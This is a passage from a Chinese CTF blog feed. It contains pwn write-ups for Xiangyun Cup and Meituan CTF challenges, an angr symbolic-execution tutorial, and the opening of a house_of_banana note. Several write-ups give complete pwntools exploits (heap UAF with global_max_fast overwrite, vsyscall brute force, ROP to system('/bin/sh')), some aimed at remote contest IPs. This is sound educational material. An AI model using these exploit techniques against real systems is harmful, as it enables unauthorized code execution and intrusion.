class="hljs-number">0x30</span>) + p64(write)<br>p.sendline(rop)<br><br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>2022祥云杯</title>
    <url>/2022/11/11/2022-11-11-2022%E7%A5%A5%E4%BA%91%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><p>libc版本为2.27， 沙箱开了跟没开差不多。。</p>
<p><img src="/2022/11/11/2022-11-11-2022%E7%A5%A5%E4%BA%91%E6%9D%AF/image-20221111223338481.png"><span class="image-caption">image-20221111223338481</span></p>
<p><img src="/2022/11/11/2022-11-11-2022%E7%A5%A5%E4%BA%91%E6%9D%AF/image-20221111223405916.png"><span class="image-caption">image-20221111223405916</span></p>
<p>程序含有加密和解密的两个函数，这两个函数十分复杂，但是无需用到，其他几个简单的函数里面的功能已经足够获取到flag了。</p>
<p><img src="/2022/11/11/2022-11-11-2022%E7%A5%A5%E4%BA%91%E6%9D%AF/image-20221111223552784.png"><span class="image-caption">image-20221111223552784</span></p>
<p>flag已经提前读取到了一个堆块内。</p>
<p><img src="/2022/11/11/2022-11-11-2022%E7%A5%A5%E4%BA%91%E6%9D%AF/image-20221111223639107.png"><span class="image-caption">image-20221111223639107</span></p>
<p>释放堆块存在UAF。</p>
<p><img src="/2022/11/11/2022-11-11-2022%E7%A5%A5%E4%BA%91%E6%9D%AF/image-20221111223451708.png"><span class="image-caption">image-20221111223451708</span></p>
<p>可以申请十六次堆块，堆块大小十分宽松，在0x60000以内即可，写堆块直接就是read读入。</p>
<p><img src="/2022/11/11/2022-11-11-2022%E7%A5%A5%E4%BA%91%E6%9D%AF/image-20221111223736604.png"><span class="image-caption">image-20221111223736604</span></p>
<p>所以题目的重点在于把堆块内的 flag 打印出来即可，这题可以 IO 打印出堆块内容。通过 unsorted bin attack 改大 global_max_fast ，造成 fastbinY 数组溢出，从而释放大堆块后可以往 main_arena 后面的地址上写入堆地址，本题选择往 write_base 和 write_ptr 写入内容，最后 exit 退出刷新 IO，即可打印出 flag 。 </p>
<p>计算申请的 size 公式为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">size = (target_addr - main_arena - <span class="hljs-number">0x18</span>) * <span class="hljs-number">2</span> + <span class="hljs-number">0x20</span><br></code></pre></td></tr></table></figure>

<p>还可以往 main_arena 后面的地址上写入任意的 8 位十六进制数，因为在 malloc 的时候会把 fastbinsY 的链表头部取出，并且把其 fd 位置的内容作为链表头部写入到 fastbinsY 数组中，而在这个过程中是没有对可控堆块的 fd 位置的内容的合法性做检查。</p>
<p>最后一个小问题就是，要写入 write_base 位置的堆块最好能距离存放 flag 堆块在 0x100 内，这样可以避免堆地址随机化 1/16。</p>
<p>成功打印 flag 。</p>
<p><img src="/2022/11/11/2022-11-11-2022%E7%A5%A5%E4%BA%91%E6%9D%AF/image-20221111231643391.png"><span class="image-caption">image-20221111231643391</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./leak&#x27;</span>)<br>DEBUG = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)<br>    ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ld-2.27.so&quot;</span>)<br>    p = process(argv=[ld.path,elf.path], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;127&#x27;</span><br>    port = <span class="hljs-number">30007</span><br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx, size</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>	<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)<br>    p.send(content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br>    <br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xa48</span>*<span class="hljs-number">2</span>+<span class="hljs-number">0x20</span>)  <span class="hljs-comment"># base</span><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0xa50</span>*<span class="hljs-number">2</span>+<span class="hljs-number">0x20</span>)  <span class="hljs-comment"># ptr</span><br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0xa28</span>*<span class="hljs-number">2</span>+<span class="hljs-number">0x20</span>)  <span class="hljs-comment"># IO flag</span><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0xa48</span>*<span class="hljs-number">2</span>+<span class="hljs-number">0x20</span>)  <br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0xa50</span>*<span class="hljs-number">2</span>+<span class="hljs-number">0x20</span>) <br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0xa28</span>*<span class="hljs-number">2</span>+<span class="hljs-number">0x20</span>) <br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x430</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">6</span>)<br>debug()<br>lw = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;tow bytes==&gt;&quot;</span>)) <span class="hljs-comment"># 本地调试避免 1/16 的随机化。</span><br>edit(<span class="hljs-number">6</span>, p64(<span class="hljs-number">0</span>) + p16(lw - <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x430</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>, p8(<span class="hljs-number">0</span>))<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0xa48</span>*<span class="hljs-number">2</span>+<span class="hljs-number">0x20</span>)<br>free(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">4</span>, p8(<span class="hljs-number">0</span>))<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0xa50</span>*<span class="hljs-number">2</span>+<span class="hljs-number">0x20</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>, p64(<span class="hljs-number">0xfbad1800</span>))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0xa28</span>*<span class="hljs-number">2</span>+<span class="hljs-number">0x20</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Your choice: &quot;</span>, <span class="hljs-string">b&#x27;6&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="unexploitable"><a href="#unexploitable" class="headerlink" title="unexploitable"></a>unexploitable</h2><p>题目只给了一个栈溢出，没有调用任何的输出函数，保护除了canary都开了。利用<code>vsysycall 0xffffffffff600000</code>滑到主函数的返回地址，然后对进行 1/4096 的爆破。。。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./unexploitable&#x27;</span>)    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&quot;./unexploitable&quot;)</span><br>        p = remote(<span class="hljs-string">&#x27;47.95.3.91&#x27;</span>, <span class="hljs-number">38768</span>)<br>        p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+ p64(<span class="hljs-number">0xffffffffff600000</span>)*<span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;\x02\x93\x30&#x27;</span>) <br>        sleep(<span class="hljs-number">0.1</span>)<br>        p.sendline(<span class="hljs-string">b&#x27;ls&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> p.recv(timeout=<span class="hljs-number">0.5</span>):<br>            p.sendline(<span class="hljs-string">b&#x27;cat flag&#x27;</span>)<br>            pause()<br>        <span class="hljs-keyword">else</span>:<br>            p.close()<br>            <span class="hljs-keyword">continue</span><br>        p.interactive()<br>    <span class="hljs-keyword">except</span>:<br>        p.close()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>美团CTF</title>
    <url>/2022/09/19/2022-09-19-%E7%BE%8E%E5%9B%A2CTF/</url>
    <content><![CDATA[<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p><img src="/2022/09/19/2022-09-19-%E7%BE%8E%E5%9B%A2CTF/image-20220919194924108.png"><span class="image-caption">image-20220919194924108</span></p>
<p>数组越界，修改该函数内的返回地址进行ROP即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>DEBUG = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    p = process(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;39.106.78.22&#x27;</span><br>    port = <span class="hljs-number">13535</span><br>    libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;5. leave\n&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)<br>    p.send(content)<br>	<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;5. leave\n&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)<br>    p.send(content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;5. leave\n&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;5. leave\n&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot; &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br>pop_ret = <span class="hljs-number">0x00000000004017b3</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    free(i)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ecce0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak)<br>sys = leak + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = leak + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><span class="hljs-comment">#debug()</span><br>edit(-<span class="hljs-number">4</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x000000000040101a</span>) + p64(pop_ret) + p64(binsh) + p64(sys))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="捉迷藏"><a href="#捉迷藏" class="headerlink" title="捉迷藏"></a>捉迷藏</h2><p><img src="/2022/09/19/2022-09-19-%E7%BE%8E%E5%9B%A2CTF/image-20220919195055312.png"><span class="image-caption">image-20220919195055312</span></p>
<p><img src="/2022/09/19/2022-09-19-%E7%BE%8E%E5%9B%A2CTF/image-20220919195125818.png"><span class="image-caption">image-20220919195125818</span></p>
<p>因为附件的程序分支过多，并且给了后门函数，猜测存在栈溢出。因此先寻找输入点，发现在该处的输入存在溢出。直接使用angr无法直接得出到达该点的条件，所以需要前排除掉一些分支后再使用angr确定条件。</p>
<p><img src="/2022/09/19/2022-09-19-%E7%BE%8E%E5%9B%A2CTF/image-20220919195500849.png"><span class="image-caption">image-20220919195500849</span></p>
<p>知道了流程后，就是一步步满足条件，最终跳到溢出点。</p>
<p><img src="/2022/09/19/2022-09-19-%E7%BE%8E%E5%9B%A2CTF/image-20220919213158699.png"><span class="image-caption">image-20220919213158699</span></p>
<p>前面几个我都是直接空格填满个数就过了，没去细究为什么。而这个必须要研究，不然过不去。</p>
<p><img src="/2022/09/19/2022-09-19-%E7%BE%8E%E5%9B%A2CTF/image-20220919213237484.png"><span class="image-caption">image-20220919213237484</span></p>
<p>要满足0x2426即9254，而这个获取输入的逻辑为不为空格，且循环次数不能大于19次，他就会一次读一个字符，而最后把读取到的字符转为int类型。所以，为了达成9254，则拆分成’9’，’2’，’5’，’4’进行输入，然后再以一个空格结尾结束getchar。而后面的几个都以输入空格即可，因为返回值就是0，没必要单独取0。</p>
<p>最后一层条件使用angr计算</p>
<p><img src="/2022/09/19/2022-09-19-%E7%BE%8E%E5%9B%A2CTF/image-20220919214549112.png"><span class="image-caption">image-20220919214549112</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br>path_to_binary = <span class="hljs-string">&quot;./pwn&quot;</span> <br>project = angr.Project(path_to_binary, auto_load_libs=<span class="hljs-literal">False</span>)<br>initial_state = project.factory.blank_state(addr=<span class="hljs-number">0x00000000004076BD</span>)<br>simulation = project.factory.simgr(initial_state)<br>print_good_address = <span class="hljs-number">0x00000000004079D7</span> <br>simulation.explore(find=print_good_address, avoid=<span class="hljs-number">0x0000000000407A4F</span>)<br><span class="hljs-keyword">if</span> simulation.found:<br>    solution_state = simulation.found[<span class="hljs-number">0</span>]  <span class="hljs-comment"># 获取通过 explore 找到符合条件的状态</span><br>    solution = solution_state.posix.dumps(sys.stdin.fileno())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Success! Solution is: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(solution))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br></code></pre></td></tr></table></figure>



<p>成功getshell</p>
<p><img src="/2022/09/19/2022-09-19-%E7%BE%8E%E5%9B%A2CTF/image-20220919213808741.png"><span class="image-caption">image-20220919213808741</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>back_door = <span class="hljs-number">0x40132c</span><br>ret = <span class="hljs-number">0x000000000040101a</span><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x0000000000407ADE&quot;)</span><br>p.sendafter(<span class="hljs-string">b&#x27;sbAmJLMLWm:&#x27;</span>, <span class="hljs-string">b&#x27; &#x27;</span>*<span class="hljs-number">0x8</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;HuEqdjYtuWo:&#x27;</span>, <span class="hljs-string">b&#x27; &#x27;</span>*<span class="hljs-number">0x33</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;hbsoMdIRWpYRqvfClb:&#x27;</span>, <span class="hljs-string">b&#x27; &#x27;</span>*<span class="hljs-number">0x35</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;tfAxpqDQuTCyJw:&#x27;</span>, <span class="hljs-string">b&#x27; &#x27;</span>*<span class="hljs-number">0x22</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;UTxqmFvmLy:&#x27;</span>, <span class="hljs-string">b&#x27; &#x27;</span>*<span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;9&#x27;</span> + <span class="hljs-string">b&#x27;2&#x27;</span> + <span class="hljs-string">b&#x27;5&#x27;</span> + <span class="hljs-string">b&#x27;4&#x27;</span> + <span class="hljs-string">b&#x27; &#x27;</span>*<span class="hljs-number">5</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;LLQPyLAOGJbnm:&#x27;</span>, <span class="hljs-string">b&#x27;&lt;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xf</span> + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(ret) + p64(back_door)<br>payload = payload.ljust(<span class="hljs-number">0x37</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;gRGKqIlcuj:&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="ret2libc-aarch64"><a href="#ret2libc-aarch64" class="headerlink" title="ret2libc_aarch64"></a>ret2libc_aarch64</h2><h2 id="smtp"><a href="#smtp" class="headerlink" title="smtp"></a>smtp</h2>]]></content>
  </entry>
  <entry>
    <title>angr使用</title>
    <url>/2022/09/08/2022-09-08-angr%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>ref：<a href="https://www.anquanke.com/post/id/212816#h3-9">https://www.anquanke.com/post/id/212816#h3-9</a></p>
<h2 id="Python国内镜像加速"><a href="#Python国内镜像加速" class="headerlink" title="Python国内镜像加速"></a>Python国内镜像加速</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd ~<br>mkdir ~/.pip<br>cd ~/.pip<br>vim pip.conf<br></code></pre></td></tr></table></figure>

<p>在pip.conf填入下面内容</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-keyword">global</span>]<br><span class="hljs-keyword">index</span>-url = https://pypi.tuna.tsinghua.edu.cn/simple<br>[install]<br><span class="hljs-keyword">trusted</span>-host=mirrors.aliyun.com<br></code></pre></td></tr></table></figure>

<h2 id="angr安装与简单使用"><a href="#angr安装与简单使用" class="headerlink" title="angr安装与简单使用"></a>angr安装与简单使用</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>安装环境：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper<br></code></pre></td></tr></table></figure>

<p>安装angr</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mkvirtualenv --python=$(which python3) angr &amp;&amp; pip install angr<br></code></pre></td></tr></table></figure>

<p>如果出现mkvirtualenv: command not found报错：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo pip install virtualenv<br>sudo pip install virtualenvwrapper<br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd ~/<br>vim .bashrc<br><span class="hljs-meta">#</span><span class="bash">在文末添加</span><br>export WORKON_HOME=~/.environments<br>source /usr/share/virtualenvwrapper/virtualenvwrapper.sh<br></code></pre></td></tr></table></figure>

<p>最后执行下面语句保存设置。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">source ~/.bashrc<br></code></pre></td></tr></table></figure>

<h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><p>因为是安装在虚拟环境的，所以在执行脚本前，先执行下面语句切换到虚拟环境。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mkvirtualenv --python=$(which python3) angr<br></code></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">state</th>
<th align="center">explain</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.blank_state</td>
<td align="center">大多数数据未初始化，进入时返回没有约束的符号值</td>
</tr>
<tr>
<td align="center">.entry state</td>
<td align="center">准备调用main之前的状态</td>
</tr>
<tr>
<td align="center">.full_init_state</td>
<td align="center">共享库和预定义内容都已经加载完毕，在enter状态之前，例如刚刚加载完共享库</td>
</tr>
<tr>
<td align="center">call_state</td>
<td align="center">准备调用函数的状态</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br>path_to_binary = <span class="hljs-string">&quot;./pwn&quot;</span>  <span class="hljs-comment"># 二进制文件路径</span><br>project = angr.Project(path_to_binary, auto_load_libs=<span class="hljs-literal">False</span>)  <span class="hljs-comment"># 加载二进制文件，一般不引入库文件</span><br>initial_state = project.factory.entry_state()  <span class="hljs-comment"># 记录程序的初始状态</span><br>simulation = project.factory.simgr(initial_state)  <span class="hljs-comment"># 模拟执行时的某个时刻的程序状态</span><br>print_good_address = <span class="hljs-number">0x00000000004008BD</span>  <br>simulation.explore(find=print_good_address)  <span class="hljs-comment"># 想要抵达的程序中的某个地址，还可以设置参数avoid即避免进入到的地址。</span><br><span class="hljs-keyword">if</span> simulation.found:<br>    solution_state = simulation.found[<span class="hljs-number">0</span>]  <span class="hljs-comment"># 获取通过 explore 找到符合条件的状态</span><br>    solution = solution_state.posix.dumps(sys.stdin.fileno())  <span class="hljs-comment"># 提取出抵达地址时所需要满足的条件</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Success! Solution is: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(solution))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>避免路径爆炸：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br>path_to_binary = <span class="hljs-string">&quot;./pwn&quot;</span>  <span class="hljs-comment"># 二进制文件路径</span><br>project = angr.Project(path_to_binary, auto_load_libs=<span class="hljs-literal">False</span>)  <span class="hljs-comment"># 加载二进制文件，一般不引入库文件</span><br>initial_state = project.factory.blank_state(addr=<span class="hljs-number">0x4007d8</span>)  <span class="hljs-comment"># 从0x4007d8开始寻找find地址</span><br>simulation = project.factory.simgr(initial_state)  <span class="hljs-comment"># 模拟执行时的某个时刻的程序状态</span><br>print_good_address = <span class="hljs-number">0x00000000004008BD</span> <br>avoid_address = <span class="hljs-number">0x4008d0</span><br>simulation.explore(find=print_good_address, avoid=avoid_address)  <span class="hljs-comment"># 想要抵达的程序中的某个地址，还可以设置参数avoid即避免进入到的地址。</span><br><span class="hljs-keyword">if</span> simulation.found:<br>    solution_state = simulation.found[<span class="hljs-number">0</span>]  <span class="hljs-comment"># 获取通过 explore 找到符合条件的状态</span><br>    solution = solution_state.posix.dumps(sys.stdin.fileno())  <span class="hljs-comment"># 提取出抵达地址时所需要满足的条件</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Success! Solution is: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(solution))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br></code></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>house_of_banana</title>
    <url>/2022/08/25/2022-08-25-house-of-banana/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>借2022长城杯的一道题学习 house_of_banana。</p>
<h2 id="House-Of-Banana-原理"><a href="#House-Of-Banana-原理" class="headerlink" title="House_Of_Banana 原理"></a>House_Of_Banana 原理</h2><p>详细原理可以直接查看放在学习链接里的文章，我也是通过这篇文章学习的，内容就不搬过来了。</p>
<p>house_of_banana 攻击的是 _rtld_global 的 link_map 链表，通过正常 main 函数返回或者调用 exit 退出，触发函数调用链：<code>exit()-&gt;_dl_fini-&gt;(fini_t)array[i]</code>。</p>
